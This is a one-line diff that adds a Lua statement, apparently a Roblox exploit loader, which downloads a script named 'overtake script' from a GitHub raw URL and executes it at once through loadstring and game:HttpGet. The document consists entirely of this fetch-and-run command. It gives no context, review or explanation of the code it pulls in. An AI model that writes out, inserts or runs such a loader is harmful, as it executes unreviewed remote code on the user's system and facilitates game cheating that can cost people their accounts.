@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/decryp1/OVERTAKE/refs/heads/main/overtake%20script"))()
